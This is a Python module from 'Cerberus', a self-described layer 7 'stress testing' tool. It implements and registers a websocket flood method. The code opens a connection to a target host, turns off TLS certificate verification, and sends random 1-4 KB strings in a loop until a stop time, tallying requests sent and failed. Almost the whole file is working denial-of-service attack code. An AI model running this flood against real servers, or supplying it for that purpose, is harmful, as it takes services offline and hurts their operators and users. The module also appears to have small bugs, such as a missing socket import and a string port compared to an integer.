'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, asyncio, ssl

from websocket import create_connection
from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *

def on_error(a,b): return
def on_close(a,b,c): return

async def flood(attack_id, url, stoptime) -> None:

    address = urlparse(url).netloc.split(':')

    host = address[0]
    if len(address) == 1:
        port = 80
    else:
        port = address[1]

    wsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wsock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    wsock.settimeout(3)
    
    while Core.killattack:
        try: wsock.connect( (host, int(port)) ); break
        except: pass

        time.sleep(0.1)

    if port == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        mainws = create_connection(f'wss://{host}:{str(port)}', socket=wsock, on_error=on_error, on_close=on_close, timeout=5, ssl=ctx)
    else:
        mainws = create_connection(f'ws://{host}:{str(port)}', socket=wsock, on_error=on_error, on_close=on_close, timeout=5)

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:
            mainws.send(utils().randstr(randint(1024, 4096)))

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

def wrapper(attack_id, url, stoptime) -> None:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(flood(attack_id, url, stoptime))

Core.methods.update({
    'WEBSOCK': {
        'info': 'Websocket flood, supports SSL (wss://)',
        'func': wrapper
    }
})